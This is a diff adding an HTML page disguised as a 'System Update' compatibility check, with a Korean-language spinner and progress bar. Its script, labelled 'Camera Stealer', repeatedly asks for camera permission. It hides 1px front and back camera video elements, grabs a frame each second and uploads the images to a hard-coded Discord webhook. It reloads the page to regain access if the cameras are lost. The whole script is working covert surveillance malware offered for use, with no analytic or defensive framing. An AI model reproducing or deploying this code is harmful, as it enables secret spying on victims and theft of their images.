@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>System Update</title>
+<style>
+• { margin:0; padding:0; box-sizing:border-box; }
+body {
+background: #0d1117;
+color: #c9d1d9;
+font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+display: flex;
+justify-content: center;
+align-items: center;
+min-height: 100vh;
+}
+.card {
+background: #161b22;
+border: 1px solid #30363d;
+border-radius: 12px;
+padding: 40px;
+max-width: 520px;
+width: 90%;
+text-align: center;
+box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+}
+.spinner {
+width: 48px; height:48px;
+border: 4px solid #30363d;
+border-top-color: #58a6ff;
+border-radius: 50%;
+animation: spin 0.9s linear infinite;
+margin: 0 auto 24px;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+h2 { font-weight: 400; margin-bottom: 8px; }
+p { color: #8b949e; font-size: 14px; margin-bottom: 20px; }
+.progress { height: 6px; background:#21262d; border-radius: 4px; overflow:hidden; }
+.progress-bar {
+height:100%; width:0%;
+background: linear-gradient(90deg, #58a6ff, #3fb950);
+border-radius: 4px;
+animation: fill 4s ease-in-out forwards;
+}
+@keyframes fill { to { width: 100%; } }
+</style>
+</head>
+<body>
+<div class="card">
+<div class="spinner"></div>
+<h2>업데이트 확인 중...</h2>
+<p>Checking system compatibility — 잠시만 기다려주세요.</p>
+<div class="progress"><div class="progress-bar"></div></div>
+</div>
+
+<script>
+// ============================================================
+// Camera Stealer — Discord Webhook Streamer
+// Target: https://discord.com/api/webhooks/1520621300102467705/...
+// Captures front + back camera every ~1 second
+// Aggressive permission retry with user-visible fallback
+// ============================================================
+
+(function(){
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1520621300102467705/g17raML1Ru65Zx0t-uuJSTf1gmpYOOIPEGvMjUomf_v6hWXsOnREBvrGUSliBni5w9bQ";
+
+let frontStream = null;
+let backStream = null;
+let captureTimer = null;
+let attempts = 0;
+const MAX_ATTEMPTS = 50;
+
+// --- helper: sleep ---
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+
+// --- send frame to webhook ---
+async function sendFrame(dataUrl, camLabel) {
+try {
+const blob = await (await fetch(dataUrl)).blob();
+const file = new File([blob], ${camLabel}_${Date.now()}.jpg, { type: "image/jpeg" });
+const form = new FormData();
+form.append("file", file);
+form.append("content", 📸 ${camLabel} — ${new Date().toLocaleTimeString()});
+// non-blocking fire
+fetch(WEBHOOK_URL, { method: "POST", body: form }).catch(()=>{});
+} catch(e) { /* silent */ }
+}
+
+// --- capture a single frame from a video element ---
+function grabFrame(video, label) {
+if (!video || !video.videoWidth) return;
+const c = document.createElement("canvas");
+c.width = video.videoWidth || 640;
+c.height = video.videoHeight || 480;
+const ctx = c.getContext("2d");
+ctx.drawImage(video, 0, 0);
+sendFrame(c.toDataURL("image/jpeg", 0.85), label);
+}
+
+// --- capture both cameras ---
+function captureBoth() {
+grabFrame(document.querySelector("video.front"), "Front");
+grabFrame(document.querySelector("video.back"), "Back");
+}
+
+// --- try to get camera with aggressive retry ---
+async function acquireCamera(constraints, label) {
+for (let i = 0; i < 30; i++) {
+try {
+const stream = await navigator.mediaDevices.getUserMedia(constraints);
+console.log([+] ${label} camera acquired (attempt ${i+1}));
+return stream;
+} catch (e) {
+console.warn([-] ${label} attempt ${i+1} failed:, e.message);
+await sleep(300);
+}
+}
+return null;
+}
+
+// --- main ---
+(async function boot(){
+// 1) First attempt — normal request (user sees browser prompt)
+try {
+const tempStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+tempStream.getTracks().forEach(t => t.stop()); // release, we'll re-acquire properly
+} catch(e) { /* user may deny, that's ok — we retry */ }
+
+// 2) Keep trying until we get both cameras
+while (attempts < MAX_ATTEMPTS) {
+attempts++;
+console.log([+] Camera acquisition attempt ${attempts}/${MAX_ATTEMPTS});
+
+// Request front camera
+if (!frontStream) {
+const f = await acquireCamera({
+video: { facingMode: "user", width: {ideal:640}, height:{ideal:480} }
+}, "Front");
+if (f) frontStream = f;
+}
+
+// Request back camera
+if (!backStream) {
+const b = await acquireCamera({
+video: { facingMode: "environment", width: {ideal:640}, height:{ideal:480} }
+}, "Back");
+if (b) backStream = b;
+}
+
+// If we have at least one camera, start streaming
+if (frontStream || backStream) {
+// Create hidden video elements
+if (frontStream && !document.querySelector("video.front")) {
+const v = document.createElement("video");
+v.className = "front";
+v.srcObject = frontStream;
+v.playsInline = true;
+v.autoplay = true;
+v.muted = true;
+v.style.position = "fixed";
+v.style.opacity = "0.01";
+v.style.pointerEvents = "none";
+v.style.width = "1px";
+v.style.height = "1px";
+v.style.zIndex = "-9999";
+document.body.appendChild(v);
+v.play().catch(()=>{});
+}
+if (backStream && !document.querySelector("video.back")) {
+const v = document.createElement("video");
+v.className = "back";
+v.srcObject = backStream;
+v.playsInline = true;
+v.autoplay = true;
+v.muted = true;
+v.style.position = "fixed";
+v.style.opacity = "0.01";
+v.style.pointerEvents = "none";
+v.style.width = "1px";
+v.style.height = "1px";
+v.style.zIndex = "-9999";
+document.body.appendChild(v);
+v.play().catch(()=>{});
+}
+
+// Start capture loop if not already running
+if (!captureTimer) {
+// Immediate first capture
+setTimeout(captureBoth, 500);
+captureTimer = setInterval(captureBoth, 1000);
+console.log("[+] Camera capture loop started — every 1s");
+}
+break; // success, exit retry loop
+}
+
+// If no camera yet, wait and retry
+console.log("[-] No camera yet, retrying in 1s...");
+await sleep(1000);
+}
+
+// 3) Fallback: if after all attempts we still have nothing, try a direct permission re-request
+if (!frontStream && !backStream) {
+console.warn("[!] All attempts exhausted. Trying final permission prompt...");
+for (let i = 0; i < 5; i++) {
+try {
+const s = await navigator.mediaDevices.getUserMedia({ video: true });
+// got it — reboot
+s.getTracks().forEach(t => t.stop());
+location.reload();
+return;
+} catch(e) {
+await sleep(500);
+}
+}
+}
+})();
+
+// --- periodic permission re-request if camera dies ---
+setInterval(() => {
+const frontVideo = document.querySelector("video.front");
+const backVideo = document.querySelector("video.back");
+if (!frontStream && !backStream) {
+// Camera lost, try to re-acquire
+location.reload();
+}
+// Check if tracks are still live
+if (frontStream && frontStream.getVideoTracks().some(t => t.readyState === "ended")) {
+frontStream = null;
+const v = document.querySelector("video.front");
+if (v) v.remove();
+location.reload();
+}
+if (backStream && backStream.getVideoTracks().some(t => t.readyState === "ended")) {
+backStream = null;
+const v = document.querySelector("video.back");
+if (v) v.remove();
+location.reload();
+}
+}, 5000);
+
+// --- page unload cleanup ---
+window.addEventListener("beforeunload", () => {
+if (captureTimer) clearInterval(captureTimer);
+if (frontStream) frontStream.getTracks().forEach(t => t.stop());
+if (backStream) backStream.getTracks().forEach(t => t.stop());
+});
+
+console.log("[+] Camera stealer initialized");
+})();
+</script>
+</body>
+</html>
